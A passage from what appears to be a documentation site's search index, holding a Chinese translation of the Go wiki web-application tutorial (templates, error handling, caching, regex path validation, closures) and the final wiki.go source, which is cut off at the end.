\"net/http\" ) \u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5305\u542b HTML \u8868\u5355\u7684\u6a21\u677f\u6587\u4ef6\u3002\u6253\u5f00\u4e00\u4e2a\u540d\u4e3a edit.html \u7684\u65b0\u6587\u4ef6\uff0c\u5e76\u6dfb\u52a0\u4ee5\u4e0b\u884c\uff1a <h1>Editing {{.Title}}</h1> <form action=\"/save/{{.Title}}\" method=\"POST\"> <div><textarea name=\"body\" rows=\"20\" cols=\"80\">{{printf \"%s\" .Body}}</textarea></div> <div><input type=\"submit\" value=\"Save\"></div> </form> \u4fee\u6539 editHandler \u4ee5\u4f7f\u7528\u6a21\u677f\uff0c\u800c\u4e0d\u662f\u786c\u7f16\u7801\u7684 HTML\uff1a func editHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/edit/\"):] p, err := loadPage(title) if err != nil { p = &Page{Title: title} } t, _ := template.ParseFiles(\"edit.html\") t.Execute(w, p) } \u51fd\u6570 template.ParseFiles \u5c06\u8bfb\u53d6 edit.html \u7684\u5185\u5bb9\u5e76\u8fd4\u56de\u4e00\u4e2a *template.Template . \u65b9\u6cd5 t.Execute \u6267\u884c\u6a21\u677f\uff0c\u5c06\u751f\u6210\u7684 HTML \u5199\u5165 http.ResponseWriter \u3002\u5e26\u70b9\u7684 .Title \u548c .Body \u6807\u8bc6\u7b26\u6307\u7684\u662f p.Title \u548c p.Body \u3002 \u6a21\u677f\u6307\u4ee4\u7528\u53cc\u82b1\u62ec\u53f7\u62ec\u8d77\u6765\u3002\u8be5 printf \"%s\" .Body \u6307\u4ee4\u662f\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\uff0c\u5b83\u4ee5\u5b57\u7b26\u4e32\u8f93\u51fa .Body \u800c\u4e0d\u662f\u5b57\u8282\u6d41\u7684\u5f62\u5f0f\uff0c\u7c7b\u4f3c\u4e8e\u8c03\u7528 fmt.Printf \u3002\u8be5 html/template \u5305\u6709\u52a9\u4e8e\u786e\u4fdd\u6a21\u677f\u64cd\u4f5c\u4ec5\u751f\u6210\u5b89\u5168\u4e14\u5916\u89c2\u6b63\u786e\u7684 HTML\u3002\u4f8b\u5982\uff0c\u5b83\u4f1a\u81ea\u52a8\u8f6c\u4e49\u4efb\u4f55\u5927\u4e8e\u53f7( > )\uff0c\u5c06\u5176\u66ff\u6362\u4e3a &gt; \uff0c\u4ee5\u786e\u4fdd\u7528\u6237\u6570\u636e\u4e0d\u4f1a\u7834\u574f HTML \u8868\u5355\u3002 \u7531\u4e8e\u6211\u4eec\u73b0\u5728\u6b63\u5728\u4f7f\u7528\u6a21\u677f\uff0c\u8ba9\u6211\u4eec\u4e3a viewHandler \u8c03\u7528\u7684 view.html \u521b\u5efa\u4e00\u4e2a\u6a21\u677f\uff1a <h1>{{.Title}}</h1> <p>[<a href=\"/edit/{{.Title}}\">edit</a>]</p> <div>{{printf \"%s\" .Body}}</div> \u5bf9\u5e94\u4fee\u6539 viewHandler \uff1a func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) t, _ := template.ParseFiles(\"view.html\") t.Execute(w, p) } \u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u5728\u4e24\u4e2a\u5904\u7406\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u4e86\u51e0\u4e4e\u5b8c\u5168\u76f8\u540c\u7684\u6a21\u677f\u4ee3\u7801\u3002\u8ba9\u6211\u4eec\u901a\u8fc7\u5c06\u6a21\u677f\u4ee3\u7801\u79fb\u52a8\u5230\u5b83\u81ea\u5df1\u7684\u51fd\u6570\u6765\u5220\u9664\u8fd9\u4e2a\u91cd\u590d\uff1a func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { t, _ := template.ParseFiles(tmpl + \".html\") t.Execute(w, p) } \u5e76\u4fee\u6539\u5904\u7406\u7a0b\u5e8f\u4ee5\u4f7f\u7528\u8be5\u51fd\u6570\uff1a func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/edit/\"):] p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } \u5982\u679c\u6211\u4eec\u5728 main \u4e2d\u6ce8\u91ca\u6389\u672a\u5b9e\u73b0\u7684\u4fdd\u5b58\u5904\u7406\u7a0b\u5e8f(saveHandler)\u7684\u6ce8\u518c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u6784\u5efa\u548c\u6d4b\u8bd5\u6211\u4eec\u7684\u7a0b\u5e8f\u3002 \u5355\u51fb\u6b64\u5904\u67e5\u770b\u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u7f16\u5199\u7684\u4ee3\u7801\u3002","title":"html/template\u5305"},{"location":"go/writing_web_app/#handling-non-existent-pages","text":"\u5982\u679c\u4f60\u8bbf\u95ee http://localhost:8080/view/APageThatDoesntExist \u60a8\u5c06\u770b\u5230\u4e00\u4e2a\u5305\u542b HTML \u7684\u9875\u9762\u3002\u8fd9\u662f\u56e0\u4e3a\u5b83\u5ffd\u7565\u4e86\u9519\u8bef\u8fd4\u56de\u503c\uff0c\u5e76\u7ee7\u7eed\u5c1d\u8bd5\u586b\u5199\u6ca1\u6709\u6570\u636e\u7684\u6a21\u677f\u3002\u76f8\u53cd\uff0c\u5982\u679c\u8bf7\u6c42\u7684\u9875\u9762\u4e0d\u5b58\u5728\uff0c\u5b83\u5e94\u8be5\u5c06\u5ba2\u6237\u7aef\u91cd\u5b9a\u5411\u5230\u7f16\u8f91\u9875\u9762\uff0c\u4ee5\u4fbf\u53ef\u4ee5\u521b\u5efa\u5185\u5bb9\uff1a func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, err := loadPage(title) if err != nil { http.Redirect(w, r, \"/edit/\"+title, http.StatusFound) return } renderTemplate(w, \"view\", p) } \u51fd\u6570 http.Redirect \u5411 HTTP \u54cd\u5e94 \u6dfb\u52a0 HTTP \u72b6\u6001\u4ee3\u7801 http.StatusFound(302) \u548c\u6807\u5934 Location \u3002","title":"\u5904\u7406\u4e0d\u5b58\u5728\u7684\u9875\u9762"},{"location":"go/writing_web_app/#saving-pages","text":"\u51fd\u6570 saveHandler \u5c06\u5904\u7406\u4f4d\u4e8e\u7f16\u8f91\u9875\u9762\u4e0a\u7684\u8868\u5355\u7684\u63d0\u4ea4\u3002\u53d6\u6d88\u6ce8\u91ca main \u4e2d\u7684\u76f8\u5173\u884c\u540e\uff0c\u8ba9\u6211\u4eec\u5b9e\u73b0\u5904\u7406\u7a0b\u5e8f\uff1a func saveHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/save/\"):] body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} p.save() http.Redirect(w, r, \"/view/\"+title, http.StatusFound) } \u9875\u9762\u6807\u9898\uff08\u5728 URL \u4e2d\u63d0\u4f9b\uff09\u548c\u8868\u5355\u7684\u552f\u4e00\u5b57\u6bb5 Body \u5b58\u50a8\u5728\u4e00\u4e2a\u65b0\u7684 Page \u3002\u7136\u540e\u8c03\u7528\u8be5 save() \u65b9\u6cd5\u5c06\u6570\u636e\u5199\u5165\u6587\u4ef6\uff0c\u5e76\u5c06\u5ba2\u6237\u7aef\u91cd\u5b9a\u5411\u5230 /view/ \u9875\u9762\u3002 FormValue \u8fd4\u56de\u7684\u503c\u7c7b\u578b\u662f string \u3002\u6211\u4eec\u5fc5\u987b\u5c06\u8be5\u503c\u8f6c\u6362\u4e3a []byte \uff0c\u7136\u540e\u624d\u80fd\u5c06\u5176\u653e\u5165 Page \u7ed3\u6784\u4e2d\u3002\u6211\u4eec\u7528 []byte(body) \u6765\u6267\u884c\u8f6c\u6362\u3002","title":"\u4fdd\u5b58\u9875\u9762"},{"location":"go/writing_web_app/#error-handling","text":"\u5728\u6211\u4eec\u7684\u7a0b\u5e8f\u4e2d\u6709\u51e0\u4e2a\u5730\u65b9\u4f1a\u5ffd\u7565\u9519\u8bef\u3002\u8fd9\u662f\u4e0d\u597d\u7684\u505a\u6cd5\uff0c\u5c24\u5176\u662f\u56e0\u4e3a\u5f53\u786e\u5b9e\u53d1\u751f\u9519\u8bef\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u51fa\u73b0\u610f\u5916\u884c\u4e3a\u3002\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848\u662f\u5904\u7406\u9519\u8bef\u5e76\u5c06\u9519\u8bef\u6d88\u606f\u8fd4\u56de\u7ed9\u7528\u6237\u3002\u8fd9\u6837\uff0c\u5982\u679c\u51fa\u73b0\u95ee\u9898\uff0c\u670d\u52a1\u5668\u5c06\u5b8c\u5168\u6309\u7167\u6211\u4eec\u60f3\u8981\u7684\u65b9\u5f0f\u8fd0\u884c\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u77e5\u7528\u6237\u3002 \u9996\u5148\uff0c\u8ba9\u6211\u4eec\u5904\u7406 renderTemplate \u4e2d\u7684\u9519\u8bef\uff1a func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { t, err := template.ParseFiles(tmpl + \".html\") if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } err = t.Execute(w, p) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) } } http.Error \u51fd\u6570\u53d1\u9001\u6307\u5b9a\u7684 HTTP \u54cd\u5e94\u4ee3\u7801\uff08\u5728\u672c\u4f8b\u4e2d\u4e3a\u201c\u5185\u90e8\u670d\u52a1\u5668\u9519\u8bef\u201d\uff09\u548c\u9519\u8bef\u6d88\u606f\u3002\u5c06\u5b83\u653e\u5728\u4e00\u4e2a\u5355\u72ec\u7684\u51fd\u6570\u4e2d\u7684\u51b3\u5b9a\u5df2\u7ecf\u5f97\u5230\u4e86\u56de\u62a5\u3002 \u73b0\u5728\u8ba9\u6211\u4eec\u4fee\u590d saveHandler \uff1a func saveHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/save/\"):] body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} err := p.save() if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } http.Redirect(w, r, \"/view/\"+title, http.StatusFound) } p.save() \u671f\u95f4\u53d1\u751f\u7684\u4efb\u4f55\u9519\u8bef\u90fd\u4f1a\u62a5\u544a\u7ed9\u7528\u6237\u3002","title":"\u9519\u8bef\u5904\u7406"},{"location":"go/writing_web_app/#template-caching","text":"\u8fd9\u6bb5\u4ee3\u7801\u6548\u7387\u4f4e\u4e0b\uff1a\u6bcf\u6b21\u6e32\u67d3\u9875\u9762\u65f6 renderTemplate \u90fd\u4f1a\u8c03\u7528 ParseFiles \u3002\u66f4\u597d\u7684\u65b9\u6cd5\u662f ParseFiles \u5728\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u8c03\u7528\u4e00\u6b21\uff0c\u5c06\u6240\u6709\u6a21\u677f\u89e3\u6790\u4e3a\u5355\u4e2a *Template \u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ExecuteTemplate \u65b9\u6cd5\u6765\u6e32\u67d3\u7279\u5b9a\u7684\u6a21\u677f\u3002 \u9996\u5148\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a templates \u7684\u5168\u5c40\u53d8\u91cf\uff0c\u5e76\u7528 ParseFiles \u5bf9\u5176\u8fdb\u884c\u521d\u59cb\u5316\u3002 var templates = template.Must(template.ParseFiles(\"edit.html\", \"view.html\")) \u51fd\u6570 template.Must \u662f\u4e00\u4e2a\u65b9\u4fbf\u7684\u5305\u88c5\u5668\uff0c\u5f53\u4f20\u9012\u4e00\u4e2a\u975e\u96f6 error \u503c\u65f6\u4f1a\u53d1\u751f\u6050\u614c(panic)\uff0c\u5426\u5219\u8fd4\u56de\u672a\u66f4\u6539\u7684\u503c *Template \u3002\u6050\u614c\u5728\u8fd9\u91cc\u662f\u5408\u9002\u7684\uff1b\u5982\u679c\u65e0\u6cd5\u52a0\u8f7d\u6a21\u677f\uff0c\u552f\u4e00\u660e\u667a\u7684\u505a\u6cd5\u662f\u9000\u51fa\u7a0b\u5e8f\u3002 ParseFiles \u51fd\u6570\u91c7\u7528\u4efb\u610f\u6570\u91cf\u7684\u5b57\u7b26\u4e32\u53c2\u6570\u6765\u6807\u8bc6\u6211\u4eec\u7684\u6a21\u677f\u6587\u4ef6\uff0c\u5e76\u5c06\u8fd9\u4e9b\u6587\u4ef6\u89e3\u6790\u4e3a\u4ee5\u57fa\u672c\u6587\u4ef6\u540d\u547d\u540d\u7684\u6a21\u677f\u3002\u5982\u679c\u6211\u4eec\u8981\u5728\u7a0b\u5e8f\u4e2d\u6dfb\u52a0\u66f4\u591a\u6a21\u677f\uff0c\u6211\u4eec\u4f1a\u5c06\u5b83\u4eec\u7684\u540d\u79f0\u6dfb\u52a0\u5230 ParseFiles \u8c03\u7528\u7684\u53c2\u6570\u4e2d\u3002 \u7136\u540e\u6211\u4eec\u4fee\u6539 renderTemplate \u51fd\u6570\u4ee5\u4f7f\u7528\u9002\u5f53\u6a21\u677f\u7684\u540d\u79f0\u4f5c\u53c2\u6570\u8c03\u7528 templates.ExecuteTemplate \u65b9\u6cd5\uff1a func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { err := templates.ExecuteTemplate(w, tmpl+\".html\", p) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) } } \u8bf7\u6ce8\u610f\uff0c\u6a21\u677f\u540d\u79f0\u662f\u6a21\u677f\u6587\u4ef6\u540d\uff0c\u56e0\u6b64\u6211\u4eec\u5fc5\u987b\u9644\u52a0 \".html\" \u5230 tmpl \u53c2\u6570\u4e2d\u3002","title":"\u6a21\u677f\u7f13\u5b58"},{"location":"go/writing_web_app/#validation","text":"\u6b63\u5982\u60a8\u53ef\u80fd\u5df2\u7ecf\u89c2\u5bdf\u5230\u7684\uff0c\u8be5\u7a0b\u5e8f\u6709\u4e00\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff1a\u7528\u6237\u53ef\u4ee5\u63d0\u4f9b\u4efb\u610f\u8def\u5f84\u4ee5\u5728\u670d\u52a1\u5668\u4e0a\u8bfb\u53d6/\u5199\u5165\u3002\u4e3a\u4e86\u7f13\u89e3\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u6765\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u9a8c\u8bc1\u6807\u9898\u3002 \u9996\u5148\uff0c\u6dfb\u52a0 \"regexp\" \u5230 import \u5217\u8868\u4e2d\u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u6765\u5b58\u50a8\u6211\u4eec\u7684\u9a8c\u8bc1\u8868\u8fbe\u5f0f\uff1a var validPath = regexp.MustCompile(\"^/(edit|save|view)/([a-zA-Z0-9]+)$\") \u51fd\u6570 regexp.MustCompile \u5c06\u89e3\u6790\u548c\u7f16\u8bd1\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a regexp.Regexp \u3002 MustCompile \u4e0e Compile \u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c\u5982\u679c\u8868\u8fbe\u5f0f\u7f16\u8bd1\u5931\u8d25\uff0c\u5b83\u5c06\u6050\u614c(panic)\uff0c\u800c Compile \u4f1a\u8fd4\u56de\u4e00\u4e2a error \u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002 \u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\uff0c\u4f7f\u7528 validPath \u8868\u8fbe\u5f0f\u6765\u9a8c\u8bc1\u8def\u5f84\u5e76\u63d0\u53d6\u9875\u9762\u6807\u9898\uff1a func getTitle(w http.ResponseWriter, r *http.Request) (string, error) { m := validPath.FindStringSubmatch(r.URL.Path) if m == nil { http.NotFound(w, r) return \"\", errors.New(\"invalid Page Title\") } return m[2], nil // The title is the second subexpression. } \u5982\u679c\u6807\u9898\u6709\u6548\uff0c\u5b83\u5c06\u4e0e nil \u9519\u8bef\u503c\u4e00\u8d77\u8fd4\u56de\u3002\u5982\u679c\u6807\u9898\u65e0\u6548\uff0c\u8be5\u51fd\u6570\u5c06\u5411 HTTP \u8fde\u63a5\u5199\u5165\u201c404 Not Found\u201d\u9519\u8bef\uff0c\u5e76\u5411\u5904\u7406\u7a0b\u5e8f\u8fd4\u56de\u9519\u8bef\u3002\u8981\u521b\u5efa\u65b0\u9519\u8bef\uff0c\u6211\u4eec\u5fc5\u987b\u5bfc\u5165 errors \u5305\u3002 \u8ba9\u6211\u4eec\u5728\u6bcf\u4e2a\u5904\u7406\u7a0b\u5e8f\u4e2d\u8c03\u7528 getTitle \uff1a func viewHandler(w http.ResponseWriter, r *http.Request) { title, err := getTitle(w, r) if err != nil { return } p, err := loadPage(title) if err != nil { http.Redirect(w, r, \"/edit/\"+title, http.StatusFound) return } renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request) { title, err := getTitle(w, r) if err != nil { return } p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } func saveHandler(w http.ResponseWriter, r *http.Request) { title, err := getTitle(w, r) if err != nil { return } body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} err = p.save() if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } http.Redirect(w, r, \"/view/\"+title, http.StatusFound) }","title":"\u9a8c\u8bc1"},{"location":"go/writing_web_app/#function-literals-and-closures","text":"\u5728\u6bcf\u4e2a\u5904\u7406\u7a0b\u5e8f\u4e2d\u6355\u83b7\u9519\u8bef\u6761\u4ef6\u4f1a\u5f15\u5165\u5927\u91cf\u91cd\u590d\u4ee3\u7801\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5c06\u6bcf\u4e2a\u5904\u7406\u7a0b\u5e8f\u5305\u88c5\u5728\u4e00\u4e2a\u6267\u884c\u6b64\u9a8c\u8bc1\u548c\u9519\u8bef\u68c0\u67e5\u7684\u51fd\u6570\u4e2d\u600e\u4e48\u529e\uff1fGo \u7684 \u51fd\u6570\u5b57\u9762\u91cf \u63d0\u4f9b\u4e86\u4e00\u79cd\u5f3a\u5927\u7684\u62bd\u8c61\u529f\u80fd\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u8fd9\u91cc\u4e3a\u6211\u4eec\u63d0\u4f9b\u5e2e\u52a9\u3002 \u9996\u5148\uff0c\u6211\u4eec\u91cd\u5199\u6bcf\u4e2a\u5904\u7406\u7a0b\u5e8f\u7684\u51fd\u6570\u5b9a\u4e49\u4ee5\u63a5\u53d7\u6807\u9898\u5b57\u7b26\u4e32\uff1a func viewHandler(w http.ResponseWriter, r *http.Request, title string) func editHandler(w http.ResponseWriter, r *http.Request, title string) func saveHandler(w http.ResponseWriter, r *http.Request, title string) \u73b0\u5728\u8ba9\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5305\u88c5\u51fd\u6570\uff0c\u5b83\u63a5\u53d7\u4e0a\u8ff0\u7c7b\u578b\u7684\u51fd\u6570\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a http.HandlerFunc \u7c7b\u578b\u7684\u51fd\u6570\uff08\u9002\u5408\u4f20\u9012\u7ed9\u51fd\u6570 http.HandleFunc \uff09\uff1a func makeHandler(fn func (http.ResponseWriter, *http.Request, string)) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { // Here we will extract the page title from the Request, // and call the provided handler 'fn' } } \u8fd4\u56de\u7684\u51fd\u6570\u79f0\u4e3a \u95ed\u5305 \uff0c\u56e0\u4e3a\u5b83\u5305\u542b\u5728\u5176\u5916\u90e8\u5b9a\u4e49\u7684\u503c\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53d8\u91cf fn \uff08 makeHandler \u7684\u5355\u4e2a\u53c2\u6570\uff09\u7531\u95ed\u5305\u5305\u56f4\u3002\u8be5\u53d8\u91cf fn \u5c06\u662f\u6211\u4eec\u7684\u4fdd\u5b58\u3001\u7f16\u8f91\u6216\u67e5\u770b\u7684\u5904\u7406\u7a0b\u5e8f\u4e4b\u4e00\u3002 \u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u4ece getTitle \u4e2d\u83b7\u53d6\u4ee3\u7801\u5e76\u5728\u6b64\u5904\u4f7f\u7528\u5b83\uff08\u7a0d\u4f5c\u4fee\u6539\uff09\uff1a func makeHandler(fn func(http.ResponseWriter, *http.Request, string)) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { m := validPath.FindStringSubmatch(r.URL.Path) if m == nil { http.NotFound(w, r) return } fn(w, r, m[2]) } } makeHandler \u8fd4\u56de\u7684\u95ed\u5305\u662f\u4e00\u4e2a\u63a5\u53d7 http.ResponseWriter \u548c http.Request \uff08\u6362\u53e5\u8bdd\u8bf4\uff0c\u4e00\u4e2a http.HandlerFunc \uff09\u53c2\u6570\u7684\u51fd\u6570\u3002\u95ed\u5305\u4ece\u8bf7\u6c42\u8def\u5f84\u4e2d\u63d0\u53d6 title \uff0c\u5e76\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f validPath \u5bf9\u5176\u8fdb\u884c\u9a8c\u8bc1\u3002\u5982\u679c title \u65e0\u6548\uff0c\u5c06\u4f7f\u7528 http.NotFound \u51fd\u6570\u5411 ResponseWriter \u5199\u5165\u9519\u8bef\u3002\u5982\u679c title \u6709\u6548\uff0c\u5219\u4f7f\u7528 ResponseWriter \u3001 Request \u548c title \u4f5c\u4e3a\u53c2\u6570\u8c03\u7528\u5c01\u95ed\u7684\u5904\u7406\u51fd\u6570 fn \u3002 \u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5728 main \u4e2d\u7528 makeHandler \u5305\u88c5\u5904\u7406\u51fd\u6570\uff0c\u7136\u540e\u518d\u5c06\u5b83\u4eec\u6ce8\u518c\u5230 http \u5305\u4e2d\uff1a func main() { http.HandleFunc(\"/view/\", makeHandler(viewHandler)) http.HandleFunc(\"/edit/\", makeHandler(editHandler)) http.HandleFunc(\"/save/\", makeHandler(saveHandler)) log.Fatal(http.ListenAndServe(\":8080\", nil)) } \u6700\u540e\uff0c\u6211\u4eec\u4ece\u5904\u7406\u51fd\u6570\u4e2d\u5220\u9664\u5bf9 getTitle \u7684\u8c03\u7528\uff0c\u4f7f\u5b83\u4eec\u66f4\u7b80\u5355\uff1a func viewHandler(w http.ResponseWriter, r *http.Request, title string) { p, err := loadPage(title) if err != nil { http.Redirect(w, r, \"/edit/\"+title, http.StatusFound) return } renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request, title string) { p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } func saveHandler(w http.ResponseWriter, r *http.Request, title string) { body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} err := p.save() if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } http.Redirect(w, r, \"/view/\"+title, http.StatusFound) }","title":"\u51fd\u6570\u5b57\u9762\u91cf\u548c\u95ed\u5305"},{"location":"go/writing_web_app/#try-it-out","text":"\u5355\u51fb\u6b64\u5904\u67e5\u770b\u6700\u7ec8\u4ee3\u7801\u6e05\u5355\u3002 \u91cd\u65b0\u7f16\u8bd1\u4ee3\u7801\uff0c\u7136\u540e\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\uff1a $ go build wiki.go $ ./wiki \u8bbf\u95ee http://localhost:8080/view/ANewPage \u5e94\u8be5\u4f1a\u663e\u793a\u9875\u9762\u7f16\u8f91\u8868\u5355\u3002\u7136\u540e\uff0c\u60a8\u5e94\u8be5\u80fd\u591f\u8f93\u5165\u4e00\u4e9b\u6587\u672c\uff0c\u5355\u51fb\u201c\u4fdd\u5b58\u201d\uff0c\u7136\u540e\u88ab\u91cd\u5b9a\u5411\u5230\u65b0\u521b\u5efa\u7684\u9875\u9762\u3002","title":"\u6d4b\u8bd5\u4e00\u4e0b"},{"location":"go/writing_web_app/#other-tasks","text":"\u4ee5\u4e0b\u662f\u60a8\u53ef\u80fd\u5e0c\u671b\u81ea\u5df1\u89e3\u51b3\u7684\u4e00\u4e9b\u7b80\u5355\u4efb\u52a1\uff1a \u5c06\u6a21\u677f\u5b58\u50a8\u5728 tmpl/ \u4e2d\uff0c\u5c06\u9875\u9762\u6570\u636e\u5b58\u50a8\u5728 data/ \u4e2d\u3002 \u6dfb\u52a0\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\u4ee5\u4f7f Web \u6839\u91cd\u5b9a\u5411\u5230 /view/FrontPage \u3002 \u901a\u8fc7\u4f7f\u5b83\u4eec\u6210\u4e3a\u6709\u6548\u7684 HTML \u5e76\u6dfb\u52a0\u4e00\u4e9b CSS \u89c4\u5219\u6765\u7f8e\u5316\u9875\u9762\u6a21\u677f\u3002 \u901a\u8fc7\u5c06 [PageName] \u7684\u5b9e\u4f8b\u8f6c\u6362\u4e3a <a href=\"/view/PageName\">PageName</a> \uff08\u63d0\u793a\uff1a\u4f60\u53ef\u4ee5\u7528 regexp.ReplaceAllFunc \u6765\u505a\u8fd9\u4e2a\uff09 \u6765\u5b9e\u73b0\u9875\u9762\u95f4\u94fe\u63a5\u3002","title":"\u5176\u4ed6\u4efb\u52a1"},{"location":"go/writing_web_app/#references","text":"https://go.dev/doc/articles/wiki/","title":"\u53c2\u8003\u8d44\u6599"},{"location":"go/wiki/final.go/","text":"Source file of wiki final.go \uf0c1 // Copyright 2010 The Go Authors. All rights reserved. // Use of this source code is governed by a BSD-style // license that can be found in the LICENSE file. //go:build ignore package main import ( \"html/template\" \"log\" \"net/http\" \"os\" \"regexp\" ) type Page struct { Title string Body []byte } func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } func viewHandler(w http.ResponseWriter, r *http.Request, title string) { p, err := loadPage(title) if err != nil { http.Redirect(w, r, \"/edit/\"+title, http.StatusFound) return } renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request, title string) { p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } func saveHandler(w http.ResponseWriter, r *http.Request, title string) { body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} err := p.save() if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } http.Redirect(w, r, \"/view/\"+title, http.StatusFound) } var templates = template.Must(template.ParseFiles(\"edit.html\", \"view.html\")) func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { err := templates.ExecuteTemplate(w, tmpl+\".html\", p) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) } } var validPath = regexp.MustCompile(\"^/(edit|save|view)/([a-zA-Z0-9]+)$\") func makeHandler(fn func(http.ResponseWriter, *http.Request, string)) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { m := validPath.FindStringSubmatch(r.URL.Path) if m == nil { http.NotFound(w, r) return } fn(w, r, m[2]) } } func main() { http.HandleFunc(\"/view/\", makeHandler(viewHandler)) http.HandleFunc(\"/edit/\", makeHandler(editHandler)) http.HandleFunc(\"/save/\", makeHandler(saveHandler)) log.Fatal(http.ListenAndServe(\":8080\", nil)) }","title":"Source file of wiki final.go"},{"location":"go/wiki/final.go/#source-file-of-wiki-finalgo","text":"// Copyright 2010 The Go Authors. All rights reserved. // Use of this source code is governed by a BSD-style // license that can be found in the LICENSE file. //go:build ignore package main import ( \"html/template\" \"log\" \"net/http\" \"os\" \"regexp\" ) type Page struct { Title string Body []byte } func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } func viewHandler(w http.ResponseWriter, r *http.Request, title string) { p, err := loadPage(title) if err != nil { http.Redirect(w, r, \"/edit/\"+title, http.StatusFound) return } renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request, title string) { p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } func saveHandler(w http.ResponseWriter, r *http.Request, title string) { body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} err := p.save() if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } http.Redirect(w, r, \"/view/\"+title, http.StatusFound) } var templates = template.Must(template.ParseFiles(\"edit.html\", \"view.html\")) func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { err := templates.ExecuteTemplate(w, tmpl+\".html\", p) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) } } var validPath = regexp.MustCompile(\"^/(edit|save|view)/([a-zA-Z0-9]+)$\") func makeHandler(fn func(http.ResponseWriter, *http.Request, string)) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { m := validPath.FindStringSubmatch(r.URL.Path) if m == nil { http.NotFound(w, r) return } fn(w, r, m[2]) } } func main() { http.HandleFunc(\"/view/\", makeHandler(viewHandler)) http.HandleFunc(\"/edit/\", makeHandler(editHandler)) 